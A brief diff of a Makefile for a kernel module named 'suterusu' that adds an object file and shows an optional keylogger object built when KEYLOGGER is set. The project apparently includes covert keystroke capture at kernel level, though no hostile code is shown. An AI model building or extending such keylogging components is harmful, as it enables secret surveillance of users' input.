@@ -1,5 +1,5 @@
 obj-m += suterusu.o
-suterusu-objs := main.o util.o
+suterusu-objs := main.o util.o module.o
 
 ifdef KEYLOGGER
 	suterusu-objs += keylogger.o
